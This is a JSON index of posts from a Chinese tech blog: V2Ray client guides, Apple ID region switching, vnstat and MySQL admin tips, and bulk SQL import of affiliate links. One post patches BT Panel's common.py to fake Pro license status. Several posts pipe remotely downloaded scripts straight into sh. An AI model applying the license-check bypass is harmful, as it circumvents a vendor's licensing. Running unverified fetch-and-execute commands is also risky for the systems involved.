即可正常使用。","categories":[{"name":"搞软件","slug":"搞软件","permalink":"https://sobaigu.com/categories/%E6%90%9E%E8%BD%AF%E4%BB%B6/"}],"tags":[{"name":"v2ray","slug":"v2ray","permalink":"https://sobaigu.com/tags/v2ray/"},{"name":"教程","slug":"教程","permalink":"https://sobaigu.com/tags/%E6%95%99%E7%A8%8B/"}]},{"title":"v2ray新手使用指南之：苹果电脑V2RayX","slug":"v2ray-macos-V2RayX","date":"2018-12-13T14:59:04.000Z","updated":"2018-12-13T14:59:04.000Z","comments":true,"path":"v2ray-macos-V2RayX.html","permalink":"https://sobaigu.com/v2ray-macos-V2RayX.html","excerpt":"烂苹果下的界面程序支持不太好，V2RayX将就着用吧，懂的自己直接去用官方的shell脚本，自己改配置文本即可。","text":"烂苹果下的界面程序支持不太好，V2RayX将就着用吧，懂的自己直接去用官方的shell脚本，自己改配置文本即可。 第一步：下载安装 V2RayX 最新版下载地址，下载人家已经编译好的，如V2RayX.app.zip。 下载好了之后解压出来，将 V2RayX.app 复制到 应用程序 文件夹，这样就算安装好了。 或者你也可以过 Homebrew-Cask 安装： 1brew cask install v2rayx 第一次打开时会出现需要安全认证的信息，此时你需要点完所有系统弹出的窗口里的 是，打开，确认等选项，然后打开 系统偏好设置》安全性与隐私，你就会看见灰色的一条，大概意思为 V2RayX，未被安全认证，是否打开，后面有一个 仍要打开 的选项，点开就好。然后你就会在状态栏看到 V2RayX 图标。 第二步：添加服务器节点 获取服务器节点信息请参考公共的节点信息获取方法。 在后台界面，点节点的显示详细配置按钮可见详细配置信息，服务器IP，服务器端口，用户ID这些有就照抄，没有的就保持默认即可。如果是自己搭建的服务器，那一些高级的玩法配置，点击传输协议高级选项卡即可对对应的协议进行配置。 以下图示演示了 ws+tls 协议的配置： 第三步：开启代理 点击状态栏图标，V2Ray:on 为灰色的表示启用状态，开启 V2RayX 后系统也就开启了代理，无需再去配置浏览器之类的，开启你的新世界吧。软件代理模式有PAC和全局模式可选，一般选PAC模式即可，PAC和全局的区别可参考：PAC模式和全局模式有什么区别","categories":[{"name":"搞软件","slug":"搞软件","permalink":"https://sobaigu.com/categories/%E6%90%9E%E8%BD%AF%E4%BB%B6/"}],"tags":[{"name":"v2ray","slug":"v2ray","permalink":"https://sobaigu.com/tags/v2ray/"},{"name":"教程","slug":"教程","permalink":"https://sobaigu.com/tags/%E6%95%99%E7%A8%8B/"}]},{"title":"v2ray新手使用指南之：安卓V2RayNG","slug":"v2ray-android-V2RayNG","date":"2018-12-13T14:58:01.000Z","updated":"2018-12-13T14:58:01.000Z","comments":true,"path":"v2ray-android-V2RayNG.html","permalink":"https://sobaigu.com/v2ray-android-V2RayNG.html","excerpt":"V2RayNG支持Shadowsocks和vmess协议，且支持订阅，算比较优秀的一款，不喜欢的可以尝试下其他客户端，差别都不大。","text":"V2RayNG支持Shadowsocks和vmess协议，且支持订阅，算比较优秀的一款，不喜欢的可以尝试下其他客户端，差别都不大。 第一步：下载安装V2RayNG 最新版下载地址，就下那个 app-universal-release.apk。 下载后安装，这个不需要说了吧。 第二步：添加服务器节点 一般都不用自己一个个去配置，点右上角那个 +，使用扫描二维码或者导入vmess链接即可。获取服务器节点信息请参考公共的节点信息获取方法 第三步：连接使用 这一步实在不知道写什么好，添加完服务器直接用就可以了，就是右下角那个不怎么好看的图标点一下，真的不需要写什么，有提示提示当然要点确定啦！！！ 其他 之前介绍过了，这个软件支持订阅，订阅的意思是通过这个地址会自动更新服务器节点，平台换了你客户端也跟着换。但当前是用不了的，因为懒得搞一些高贵的小白，还是自己去手动扫码或者导入链接进行配置吧，以后全部调试好了再用。","categories":[{"name":"搞软件","slug":"搞软件","permalink":"https://sobaigu.com/categories/%E6%90%9E%E8%BD%AF%E4%BB%B6/"}],"tags":[{"name":"v2ray","slug":"v2ray","permalink":"https://sobaigu.com/tags/v2ray/"},{"name":"教程","slug":"教程","permalink":"https://sobaigu.com/tags/%E6%95%99%E7%A8%8B/"}]},{"title":"v2ray新手使用指南之：Windows v2rayN","slug":"v2ray-windows-v2rayN","date":"2018-12-13T14:58:01.000Z","updated":"2018-12-13T14:58:01.000Z","comments":true,"path":"v2ray-windows-v2rayN.html","permalink":"https://sobaigu.com/v2ray-windows-v2rayN.html","excerpt":"v2rayN 算是一个比较优秀的WindowsGUI客户端，可以对客户端配置进行界面化管理，导入服务器，更新 V2Ray 等都比较方便。虽说这是篇v2rayN使用教程，但其实真的只是贴个图，没啥好教的。","text":"v2rayN 算是一个比较优秀的WindowsGUI客户端，可以对客户端配置进行界面化管理，导入服务器，更新 V2Ray 等都比较方便。虽说这是篇v2rayN使用教程，但其实真的只是贴个图，没啥好教的。 第一步：下载v2rayN 这种软件都是解压即用的，实在是没什么好说的：最新版下载地址，就下那个 v2rayN.zip 就可以了。 下载后解压到自己希望保存的文件夹内『这也要提醒？因为真见过不少直接在压缩包内运行的o(╥﹏╥)o』，启动 v2rayN.exe 就会自动在右下角出现一个图标，鼠标左键点弹出界面，右键点有右键功能菜单。 v2rayN 就基于 Microsoft .NET Framework 4.6 or higher 开发的，如果你的系统里没装运行会报错，那么点此下载安装环境支持库后即可。 第二步：获取V2Ray v2rayN 只是一个皮，代理功能实现还是V2Raycore，其实你也可以从其他地方下载和v2rayN 解压在一个文件夹下用即可，但v2rayN 集成了这功能你就不用到处找：检查更新》检查更新V2Raycore 第三步：添加服务器节点 一般都不用自己一个个去配置，使用订阅节点，扫描二维码或者导入vmess链接即可。获取服务器节点信息请参考公共的节点信息获取方法 添加服务器节点 复制好 vmess:// 链接或点开二维码后，回到v2rayN 界面点 服务器 一键完成配置后，我们选择该服务器直接回车或者右键将该服务器设置为活动即表示使用该服务器，也可以右键进行测速，删除等操作，双击则会打开参数配置界面。 启用代理 要主动让软件接管系统代理设置，需要在右下角托盘区找到v2rayN 图标，然后 右键》勾选启用HTTP代理 就可以开始使用了。 代理根据自己的需求选择，全局就是所有连接都过代理，PAC即是在PAC列表中的才过代理。在程序目录下有个 pac.txt 自行打开就能看到哪些域名需要代理了，如果某个域名不被代理也不想使用全局，那么将自己要代理的域名按规则添加到该文件即可。PAC文件规则可参考：添加PAC自定义规则。","categories":[{"name":"搞软件","slug":"搞软件","permalink":"https://sobaigu.com/categories/%E6%90%9E%E8%BD%AF%E4%BB%B6/"}],"tags":[{"name":"v2ray","slug":"v2ray","permalink":"https://sobaigu.com/tags/v2ray/"},{"name":"教程","slug":"教程","permalink":"https://sobaigu.com/tags/%E6%95%99%E7%A8%8B/"}]},{"title":"V2Ray新手使用指南","slug":"v2ray-tourist","date":"2018-12-13T13:26:39.000Z","updated":"2018-12-13T13:26:39.000Z","comments":true,"path":"v2ray-tourist.html","permalink":"https://sobaigu.com/v2ray-tourist.html","excerpt":"","text":"前言 功夫网升级从来没有停止过，不是第一次也不会是最后一次大规模断梯子，大家不要在外网抹黑祖国，不要受轮子遗毒蛊惑，否则民警会上门关怀。 因为网上能找到的服务器死了好多，逼不得已转向V2Ray，发现当前V2Ray可用性尚可，技术更灵活，相应的部署使用也更复杂，整理了些学习笔记，也希望能成为小白的教程。 教程目录 以下各块内容，点击下方标题链接即可到达对应的详细教程页。 客户端使用教程 V2Ray没有严格意义的客户端，因为客户端和服务端只是配置上的不同，缺点是他们都没有界面。 现今针对各平台操作系统，都有数款支持的第三方客户端，这里只选取本站喜欢的客户端软件示范，其他的自行摸索，也可以到项目网站去找推荐的客户端。 获取配置信息 这一步跟自己用什么设备都没有任何区别。 如果你是自己搭建的服务端，那可以在服务端生成 vmess:// 链接，或者你知道详细配置，一个个在客户端上配即可。没有自己的服务器可以到此免费获取账号)获取。注册登录后，在首页可见使用说明和自己账号可用的节点。 1. Windows客户端 v2rayN 算是一个比较优秀的WindowsGUI客户端，可以对客户端配置进行界面化管理，导入服务器，更新 V2Ray 等都比较方便。 2. macOS客户端 V2RayX 是一个基于 V2Ray 内核的 Mac OS X 客户端。用户可以通过界面生成配置文件，并且可以手动更新 V2Ray 内核。V2RayX 还可以配置系统代理。 3. Android客户端 V2Ray 安卓对新手比较友好的客户端有 V2RayNG 和 BifrostV。V2RayNG支持Shadowsocks和vmess协议，且支持订阅，算比较优秀的一款。 4. iphone客户端 IOS下客户端有小火箭，Kitsunebi，Quantumult等，其中小火箭这个全能客户端首推，小火箭支持vmess但不支持mkcp协议。 不想额外再多写其他教程了，请点击该节标题参照相关教程即可，大同小异。 5. Linux客户端 都会用Linux了，这些小白教程应该不用看了，真的。我也懒得开虚拟机里的Linux了，就这样吧。 v2ray基础知识 V2Ray 是一个与 Shadowsocks 类似的代理软件，原理都是一样的，可以用来科学上网，学习国外先进科学技术，是梯子界的后起之秀，要看基础知识当然首选官方文档啦，其实已经有很详细的教程文档了，自行去查阅。 官网地址：https://www.v2ray.com/ 项目主页：https://github.com/v2ray/v2ray-core 你可能会出现打不开的情况，因为这种都是敏感项目，就像Shadowsocks作者被请喝茶后主动删代码一样 划重点：科学原理 V2Ray 的特色功能是能够结合CDN对流量进行分流，中转，结合一些正常网站实现高逼格伪装，是目前相对完美的解决方案。 但无论如何，请时刻谨记：民警上门关怀非常容易！！！ 但无论如何，请时刻谨记：民警上门关怀非常容易！！！ 但无论如何，请时刻谨记：民警上门关怀非常容易！！！ 服务端搭建 服务端说简单也简单，说复杂也复杂，相比Shadowsocks确实要复杂得多，源代码可以到此获取。在不了解基础知识的情况下，建议用别人做好的一键脚本安装。能用即可，还要啥自行车！","categories":[{"name":"搞软件","slug":"搞软件","permalink":"https://sobaigu.com/categories/%E6%90%9E%E8%BD%AF%E4%BB%B6/"}],"tags":[{"name":"v2ray","slug":"v2ray","permalink":"https://sobaigu.com/tags/v2ray/"},{"name":"教程","slug":"教程","permalink":"https://sobaigu.com/tags/%E6%95%99%E7%A8%8B/"}]},{"title":"注册更换为国外AppleID的方法","slug":"appleid-change-location","date":"2018-12-03T14:30:29.000Z","updated":"2018-12-03T14:30:29.000Z","comments":true,"path":"appleid-change-location.html","permalink":"https://sobaigu.com/appleid-change-location.html","excerpt":"","text":"前言 如果你用的烂苹果家的设备，那么按正途都在App Store里傻瓜式的点获取安装，但有些软件在大陆区是不让上架或者下载不到的，这个时候你需要要用到非大陆的AppleID，本文便是个简单注册非大陆AppleID的教程，你值得拥有一个以备不时之需。 首先：注册一个解放区ID 打开烂苹果官网，翻到页面底部，创建新的AppleID，注册一个中国区的AppleID，，填写你用于注册的邮箱、手机号、安全提示问题等信息就行了，实在没什么好教的。 注意自己记录一下注册时填写的安全提示问题 其次：登录App Store 刚刚注册好的AppleID，请先在你的IOS设备的App Store登陆一次，接下来是操作要点。 第一步：点击「Review/检查」 因为你是第一次登录Appstore，会有如下提示： 第二步：选择付款方式为「无」 选择付款方式为无，然后点击右上角的『Next/下一步』 第三步：切换国家 还是打开烂苹果官网，然后登陆刚刚注册的帐号，点击右上角的『编辑』 此处记得，切换国家选择『菲律宾』，会有下图提示，请点击『继续更新』 最后一步：设置付款方式 然后你就可以发现，你可以直接选择付款方式为『无』！最后，剩下的信息，你就可以随意填写啦 在标示了位数的地方，填写对位数就行，数字可以随便写，填完后记得点页面右上角的保存，然后你就拥有一个菲律宾的AppleID啦！ 后记 这个方法，据说淘宝上售价上百，如果你看完至此，是不是突然有捡到一张毛爷爷般的幸福感？","categories":[{"name":"搞软件","slug":"搞软件","permalink":"https://sobaigu.com/categories/%E6%90%9E%E8%BD%AF%E4%BB%B6/"}],"tags":[{"name":"软件","slug":"软件","permalink":"https://sobaigu.com/tags/%E8%BD%AF%E4%BB%B6/"},{"name":"手机","slug":"手机","permalink":"https://sobaigu.com/tags/%E6%89%8B%E6%9C%BA/"}]},{"title":"vnstat一直提示 `eth0: Not enough data available yet`","slug":"vnstat-eth0-not-enough-data-available-yet","date":"2018-11-27T14:35:41.000Z","updated":"2018-11-27T14:35:41.000Z","comments":true,"path":"vnstat-eth0-not-enough-data-available-yet.html","permalink":"https://sobaigu.com/vnstat-eth0-not-enough-data-available-yet.html","excerpt":"","text":"前言 vnstat是个Linux下基于shell终端的网络流量监控工具，可帮助用户在不同时间段内监视，记录和查看网络统计信息。 它提供了各种网络接口的汇总，它允许用户以详细表或命令行统计视图的形式查看小时，每日，每月统计，统计VPS的流量使用工具还是比较方便的。 软件安装 一般直接安装命令就可以了，比如CentOS下直接输入下面的命令： 1yum install vnstat 如果出现找不到软件，可参考此教程解决。 创建数据库 首先需要创建数据库： 1vnstat --create -i eth0 实际上第一次直接运行 vnstat 命令会自动提示让创建数据库，这里默认监控网卡 eth0 ，根据自己实际情况修改。如果是之前安装过，可以加 -u 参数升级，不存在的话会创建该数据库： 1vnstat -u -i eth0 其他使用命令 其实只有几个命令，可以查看帮助文档。 123456vnstat -l #查看实时流量统计vnstat -l -i eth0 #查看指定网络接口的实时流量统计vnstat -h #按小时查看vnstat -d #按天查看vnstat -w #按周查看vnstat -m #按月查看 遇到的问题 提示：Not enough data available yet 可能你安装好了，vnstat -l 可以查看统计，但其他的就提示 Not enough data available yet，隔天去看还是这样，其实这是有问题的，多半可能是vnstat没有正常运行，可以按下面的方法解决： 123/etc/init.d/vnstat status #查看运行状态/etc/init.d/vnstat start #启动vnstatchkconfig vnstat on #设置开机启动 上面是以CentOS6示例，如果是CentOS7或其他发行版，使用对应命即可，大同小异： 123systemctl enable vnstatsystemctl start vnstatsystemctl status vnstat 启动后就可以看到相关流量统计数据了。 1234567891011121314151617181920[root@LA-quarterly ~]# /etc/init.d/vnstat statusvnstatd is stopped[root@LA-quarterly ~]# /etc/init.d/vnstat startStarting vnstatd: [ OK ][root@LA-quarterly ~]# /etc/init.d/vnstat statusvnstatd (pid 11395) is running...[root@LA-quarterly ~]# vnstat -d eth0 / daily day rx | tx | total | avg. rate ------------------------+-------------+-------------+--------------- 09/19/18 0 KiB | 0 KiB | 0 KiB | 0.00 kbit/s 11/27/18 72.69 MiB | 66.84 MiB | 139.53 MiB | 14.00 kbit/s ------------------------+-------------+-------------+--------------- estimated 76 MiB | 69 MiB | 145 MiB |[root@LA-quarterly ~]# vnstat -l -i eth0Monitoring eth0... (press CTRL-C to stop) rx: 1.40 Mbit/s 336 p/s tx: 1.38 Mbit/s 90 p/s^C Permission denied 现象和上面的一样，但 systemctl status vnstat 查看提示是这样的： 123456789101112[root@v56829 ~]# systemctl status vnstat● vnstat.service - vnStat network traffic monitor Loaded: loaded (/usr/lib/systemd/system/vnstat.service; disabled; vendor preset: disabled) Active: active (running) since Wed 2018-12-05 09:58:10 CST; 1 day 5h ago Docs: man:vnstatd(1) man:vnstat(1) man:vnstat.conf(5) Main PID: 11422 (vnstatd) CGroup: /system.slice/vnstat.service └─11422 /usr/sbin/vnstatd -nDec 06 13:53:18 v56829.kvm.u28283 vnstatd[11422]: Error: Unable to open database &quot;/var/lib/vnstat/eth0&quot; for writing: Permission denied 可能是软件仓库版本的问题，同一个软件在某个操作系统上出现过，而某些系统里 /var/lib/vnstat/eth0 文件权限也是root但能正常，不正常的系统里可以更改该数据库文件所属： 1234567[root@v56829 ~]# ll /var/lib/vnstat/total 4-rw-r--r-- 1 root root 2792 Dec 6 15:19 eth0[root@v56829 ~]# chown -R vnstat:vnstat /var/lib/vnstat/[root@v56829 ~]# ll /var/lib/vnstat/total 4-rw-r--r-- 1 vnstat vnstat 2792 Dec 6 15:19 eth0 更改为 vnstat 所属后，过几分钟再去运行 vnstat 就能看到流量统计结果了。","categories":[{"name":"玩系统","slug":"玩系统","permalink":"https://sobaigu.com/categories/%E7%8E%A9%E7%B3%BB%E7%BB%9F/"}],"tags":[{"name":"Linux","slug":"Linux","permalink":"https://sobaigu.com/tags/Linux/"}]},{"title":"宝塔面板开心版实现方法","slug":"make-btpanel-pro-freely","date":"2018-11-25T09:20:47.000Z","updated":"2018-11-25T09:20:47.000Z","comments":true,"path":"make-btpanel-pro-freely.html","permalink":"https://sobaigu.com/make-btpanel-pro-freely.html","excerpt":"","text":"前言 宝塔面板是个对小白比较友好的一个管理工具，很多功能很方便，用习惯了就懒得在shell里敲命令。 宝塔专业版在免费版所有功能的基础上，额外还有网站防火墙，微信小程序，负载均衡，主从复制，及任务管理器等，但PRO版确实小贵，本开心方法也并不能给你带来实质的功能，只是在首页不出现广告，因为付费插件里还有一层付费验证，正所谓开心一下而已。如果经济允许，还是建议支持官方版本。 方法 安装免费版 首选安装官方的免费版，使用官方一键安装即可： 1wget -O btinstall.sh http://download.bt.cn/install/install.sh &amp;&amp; sh btinstall.sh 升级专业版 安装完成后，继续在shell终端输入命令，升级专业版PRO： 1wget -O update.sh http://download.bt.cn/install/update_pro.sh &amp;&amp; bash update.sh pro 如果使用失败，请恢复成免费版，用以下命令即可，数据不会丢失： 1wget -O update.sh http://download.bt.cn/install/update.sh &amp;&amp; bash update.sh free 修改程序文件 上面的升级完成后，找到路径 /www/server/panel/class 打开文件 common.py ，搜索代码 第164行： 1data = panelAuth().get_order_status(None) 替换成下面的内容： 1234data = &#123; &#x27;status&#x27; : True, &#x27;msg&#x27; : &#123;&#x27;endtime&#x27; : 32503651199 &#125;&#125; 完成后，进入 /www/server/panel/data 新建一个文件，文件名为：userInfo.json 内容空的，如果存在这个文件的删掉重新新建文件。 最后输入命令 /etc/init.d/bt restart 重启宝塔，然后就可看到是PRO版，首页就没广告了。为了能用得长久不受广告打搅，建议将宝塔面板自动升级功能关闭，没什么事也不要去升级面板，够用就好。 如果嫌麻烦，还想真开心下，可以参考：阿里云服务器新开必做的几件事","categories":[{"name":"学编程","slug":"学编程","permalink":"https://sobaigu.com/categories/%E5%AD%A6%E7%BC%96%E7%A8%8B/"}],"tags":[{"name":"软件","slug":"软件","permalink":"https://sobaigu.com/tags/%E8%BD%AF%E4%BB%B6/"}]},{"title":"解决安装软件时提示：No package vnstat available","slug":"linux-fix-no-xx-available","date":"2018-11-19T07:36:41.000Z","updated":"2018-11-19T07:36:41.000Z","comments":true,"path":"linux-fix-no-xx-available.html","permalink":"https://sobaigu.com/linux-fix-no-xx-available.html","excerpt":"","text":"前言 在linux下安装软件包是件很容易的事情，但有些软件在你兴高采烈敲完安装命令后，却返回 No package vnstat available。 实例 比如想装个流量监控软件 vnstat ，在有些发行版中直接安就可以完成，但有时候却不是，比如在centos系统中直接输入 yum install vnstat ，你可能会得到下面这样的结果： 12345[root@m2 ~]# yum install vnstat Loaded plugins: fastestmirror Setting up Install Process No package vnstat available. Error: Nothing to do 原因及解决方法 原因是 vnstat 不在官方默认软件仓库中，我们需要允许外部的发行版本库才能一条命令安装。使用如下命令允许外部仓库： 1yum install epel-release 以上命令执行完后，再使用 yum install vnstat -y 就能一键安装完成了，其他发行版linux和软件安装大同小异。之后就可以使用vnstat了，使用方法可以参考此教程。","categories":[{"name":"玩系统","slug":"玩系统","permalink":"https://sobaigu.com/categories/%E7%8E%A9%E7%B3%BB%E7%BB%9F/"}],"tags":[{"name":"Linux","slug":"Linux","permalink":"https://sobaigu.com/tags/Linux/"}]},{"title":"MySQL数据库表优化","slug":"mysql-optimize-bash","date":"2018-11-17T07:38:32.000Z","updated":"2018-11-17T07:38:32.000Z","comments":true,"path":"mysql-optimize-bash.html","permalink":"https://sobaigu.com/mysql-optimize-bash.html","excerpt":"","text":"前言 在小鸡上跑了个数据库，表里数据快过百万了，每次跑定时任务都要半分钟以上，任务每分钟跑一次，所以小鸡鸡CPU长时间处于满载状态，有必要对数据库进行优化减负。 现象 最简单的方法便是使用PHP-myadmin这种工具了，直接在后台勾选要优化的表，然后对选中表进行分析优化即可。在优化过程中，有可能出现如下提示： 1Table does not support optimize, doing recreate + analyze instead 这是因为该MySQL表使用的是 innodb 引擎，此时你需要通过其他方式进行优化。 一键shell 在删除完垃圾数据后，对表进行优化可减小表的体积，同时优化索引加快表查询速度，整理了如下命令，保存为 .sh 使用即可。 123456789101112#!/bin/shecho -n &quot;MySQL username: &quot; ; read usernameecho -n &quot;MySQL password: &quot; ; stty -echo ; read password ; stty echo ; echomysql -u $username -p&quot;$password&quot; -NBe &quot;SHOW DATABASES;&quot; | grep -v &#x27;lost+found&#x27; | while read database ; domysql -u $username -p&quot;$password&quot; -NBe &quot;SHOW TABLE STATUS;&quot; $database | while read name engine version rowformat rows avgrowlength datalength maxdatalength indexlength datafree autoincrement createtime updatetime checktime collation checksum createoptions comment ; doif [ &quot;$datafree&quot; -gt 0 ] ; thenfragmentation=$(($datafree * 100 / $datalength))echo &quot;$database.$name is $fragmentation% fragmented.&quot;mysql -u &quot;$username&quot; -p&quot;$password&quot; -NBe &quot;OPTIMIZE TABLE $name;&quot; &quot;$database&quot;fidone","categories":[{"name":"做网站","slug":"做网站","permalink":"https://sobaigu.com/categories/%E5%81%9A%E7%BD%91%E7%AB%99/"}],"tags":[{"name":"shell","slug":"shell","permalink":"https://sobaigu.com/tags/shell/"}]},{"title":"淘宝客链接怎么批量导入到网站","slug":"taobaoke-piliang-daoru","date":"2018-11-08T09:43:41.000Z","updated":"2018-11-08T09:43:41.000Z","comments":true,"path":"taobaoke-piliang-daoru.html","permalink":"https://sobaigu.com/taobaoke-piliang-daoru.html","excerpt":"","text":"前言 搭建了个淘宝客网站，用的网上找的现成的WordPress淘客模板，自己做了些功能行的修改，整体已经可以成型。该淘宝客网站优惠券上万，几乎每日更新，用WordPress的文章更新是不可能的，所以需要批量进行更新替换。 方法1：使用导入插件 有人专门开发了批量导入插件，如wp-all-import，这个插件看上去很强大，但使用起来完全不顺手，而且在数据库里残留的信息太多，小服务器更新几次就不堪重负了。使用教程就不写了，网上有的是，试了两次不能满足自己的要求，所以舍弃。 方法2：使用SQL导入 在淘宝客后台能够获得excel列表，里面包含了上万的链接，这些链接是不能直接导入数据库的，需要先进行处理下，以适应主题显示的需求。 excel数据预处理 匹配分类 123456789101112=IFS(COUNT(FIND(&#123;&quot;饰&quot;,&quot;表&quot;,&quot;眼镜&quot;,&quot;箱包&quot;,&quot;个性&quot;,&quot;包装&quot;,&quot;珠宝&quot;&#125;,D2))&gt;0,&quot;包包配饰&quot;,COUNT(FIND(&#123;&quot;妆&quot;,&quot;美发&quot;,&quot;美容&quot;&#125;,D2))&gt;0,&quot;美妆彩妆&quot;,COUNT(FIND(&#123;&quot;女鞋&quot;,&quot;女装&quot;&#125;,D2))&gt;0,&quot;女装女鞋&quot;,COUNT(FIND(&#123;&quot;男鞋&quot;,&quot;男装&quot;&#125;,D2))&gt;0,&quot;男装男鞋&quot;,COUNT(FIND(&#123;&quot;护理&quot;,&quot;运动&quot;,&quot;户外&quot;&#125;,D2))&gt;0,&quot;运动户外&quot;,COUNT(FIND(&#123;&quot;茶&quot;,&quot;酒&quot;,&quot;食&quot;,&quot;饮&quot;,&quot;营养品&quot;&#125;,D2))&gt;0,&quot;零食茶饮&quot;,COUNT(FIND(&#123;&quot;智能&quot;,&quot;家具&quot;,&quot;电脑&quot;,&quot;电器&quot;,&quot;电子&quot;,&quot;数码&quot;,&quot;器&quot;,&quot;音像&quot;,&quot;家电&quot;,&quot;电玩&quot;,&quot;手机&quot;,&quot;存储&quot;,&quot;MP&quot;,&quot;网络&quot;,&quot;办公&quot;&#125;,D2))&gt;0,&quot;数码家电&quot;,COUNT(FIND(&#123;&quot;情趣&quot;,&quot;内衣&quot;,&quot;动漫&quot;,&quot;手工&quot;&#125;,D2))&gt;0,&quot;内衣情趣&quot;,COUNT(FIND(&#123;&quot;车&quot;&#125;,D2))&gt;0,&quot;汽车用品&quot;,COUNT(FIND(&#123;&quot;玩具&quot;,&quot;婴&quot;,&quot;童&quot;,&quot;孕&quot;,&quot;尿片&quot;,&quot;奶&quot;&#125;,D2))&gt;0,&quot;童装母婴&quot;,COUNT(FIND(&#123;&quot;五金&quot;,&quot;礼品&quot;,&quot;水产&quot;,&quot;粮油&quot;,&quot;日&quot;,&quot;清洁&quot;,&quot;床上&quot;,&quot;用具&quot;,&quot;收纳&quot;,&quot;洗护&quot;,&quot;书&quot;,&quot;花&quot;,&quot;居&quot;,&quot;家装&quot;,&quot;家庭&quot;,&quot;宠物&quot;,&quot;建材&quot;&#125;,D2))&gt;0,&quot;居家生活&quot;) 匹配分类ID 1=IFS(P2=&quot;男装男鞋&quot;,2,P2=&quot;女装女鞋&quot;,3,P2=&quot;包包配饰&quot;,4,P2=&quot;运动户外&quot;,5,P2=&quot;美妆彩妆&quot;,6,P2=&quot;童装母婴&quot;,7,P2=&quot;零食茶饮&quot;,8,P2=&quot;内衣情趣&quot;,9,P2=&quot;数码家电&quot;,10,P2=&quot;居家生活&quot;,11,P2=&quot;汽车用品&quot;,12) 生成SQL导入文件 生成SQL 12345=CLEAN(CONCATENATE(&quot;REPLACE INTO wp_posts(ID,post_title,post_excerpt,post_content,post_status) values(&#x27;&quot;,A2,&quot;&#x27;,&#x27;&quot;,B2,&quot;&#x27;,&#x27;&quot;,L2,&quot;&#x27;,&#x27;&quot;,B2,&quot;&#x27;,&#x27;publish&#x27;);&quot;))=CLEAN(CONCATENATE(&quot;REPLACE INTO wp_posts(ID,post_title,post_excerpt,post_status) values(&#x27;&quot;,A2,&quot;&#x27;,&#x27;&quot;,B2,&quot;&#x27;,&#x27;&quot;,L2,&quot;&#x27;,&#x27;publish&#x27;);&quot;))=CLEAN(CONCATENATE(&quot;REPLACE INTO wp_term_relationships(object_id,term_taxonomy_id) values(&#x27;&quot;,A2,&quot;&#x27;,&#x27;&quot;,Q2,&quot;&#x27;);&quot;))=CLEAN(CONCATENATE(&quot;REPLACE INTO wp_postmeta(post_id,meta_key,meta_value) values(&#x27;&quot;,A2,&quot;&#x27;,&#x27;&quot;,&quot;hao_zhutu&quot;,&quot;&#x27;,&#x27;&quot;,C2,&quot;&#x27;),(&#x27;&quot;,A2,&quot;&#x27;,&#x27;&quot;,&quot;hao_yuanj&quot;,&quot;&#x27;,&#x27;&quot;,F2,&quot;&#x27;),(&#x27;&quot;,A2,&quot;&#x27;,&#x27;&quot;,&quot;hao_xianj&quot;,&quot;&#x27;,&#x27;&quot;,O2,&quot;&#x27;),(&#x27;&quot;,A2,&quot;&#x27;,&#x27;&quot;,&quot;hao_youh&quot;,&quot;&#x27;,&#x27;&quot;,N2,&quot;&#x27;);&quot;))=CLEAN(CONCATENATE(&quot;REPLACE INTO wp_postmeta(post_id,meta_key,meta_value) values(&#x27;&quot;,A2,&quot;&#x27;,&#x27;&quot;,&quot;hao_zongl&quot;,&quot;&#x27;,&#x27;&quot;,K2,&quot;&#x27;),(&#x27;&quot;,A2,&quot;&#x27;,&#x27;&quot;,&quot;hao_ljgm&quot;,&quot;&#x27;,&#x27;&quot;,M2,&quot;&#x27;),(&#x27;&quot;,A2,&quot;&#x27;,&#x27;&quot;,&quot;hao_xiaol&quot;,&quot;&#x27;,&#x27;&quot;,G2,&quot;&#x27;),(&#x27;&quot;,A2,&quot;&#x27;,&#x27;&quot;,&quot;hao_leix&quot;,&quot;&#x27;,&#x27;&quot;,J2,&quot;&#x27;);&quot;)) SQL导入 先把数据库清理下，以免数据库残留： 1234DELETE FROM `wp_posts` WHERE `ID`&gt;12;DELETE FROM `wp_postmeta` WHERE `post_id`&gt;12;ALTER TABLE `wp_postmeta` AUTO_INCREMENT=200;DELETE FROM `wp_term_relationships` WHERE `object_id`&gt;12; 然后把之前生成的SQL文件导入到数据库即可。为了完善文章内容，可以把文章更新日期一起更新下： 1UPDATE `wp_posts` SET `post_author`=&#x27;sobaigu.com&#x27;,`post_modified`=&#x27;2018-11-8 10:37:03&#x27;,`post_modified_gmt`=&#x27;2018-11-8 10:37:09&#x27; WHERE `ID`&gt;12; 以上，就完成了将淘宝客链接批量导入及更新到网站的工作了，把公式和处理方法保存下来，以后每天15分钟即可完成上万篇内容的更新了。 其他方法 自己会折腾代码的，可以参照这个方法试下：http://blog.sina.com.cn/s/blog_5d972ae00100gjij.html","categories":[{"name":"混X圈","slug":"混X圈","permalink":"https://sobaigu.com/categories/%E6%B7%B7X%E5%9C%88/"}],"tags":[{"name":"博客建站","slug":"博客建站","permalink":"https://sobaigu.com/tags/%E5%8D%9A%E5%AE%A2%E5%BB%BA%E7%AB%99/"}]},{"title":"重置mysql的自增序列AUTO_INCREMENT初时值","slug":"reset-mysql-AUTO-INCREMENT","date":"2018-11-07T11:31:05.000Z","updated":"2018-11-07T11:31:05.000Z","comments":true,"path":"reset-mysql-AUTO-INCREMENT.html","permalink":"https://sobaigu.com/reset-mysql-AUTO-INCREMENT.html","excerpt":"在MySQL的数据库设计中，一般都会设计自增的数字列，用作业务无关的主键。 在数据库出现频繁的删除操作或者清空操作之后，其自增的值仍然会自动增长，如果需要重新开始该如何做呢？","text":"在MySQL的数据库设计中，一般都会设计自增的数字列，用作业务无关的主键。 在数据库出现频繁的删除操作或者清空操作之后，其自增的值仍然会自动增长，如果需要重新开始该如何做呢？ 怎么重置mysql的自增列想必有很多的朋友都不会吧，刚好有个数据库垃圾数据一直在增，删点减轻数据库压力。下面与大家分享下常用的几种方法，不懂的朋友可以了解下哈，希望对大家有所帮助。 方法1 12delete from tb1; ALTER TABLE tbl AUTO_INCREMENT = 100; 不过这种方式自能设置大于当前使用的值，不能设置小于等于当前已经使用的自增列的值。myisam如果设置小于等于，则自增列的值会自动设置为当前最大值加1，innodb则不会改变。 方法2 通过TRUNCATE把自增列设置为0，从MySQL 5.0.13开始TRUNCATE就能重置自增列为0。myisam和innode都是如此。 1TRUNCATE TABLE table_name; 方法3 drop和create重建表方式重置自增列为0 12DROP TABLE table_name; CREATE TABLE table_name &#123; ... &#125;; 参考文档 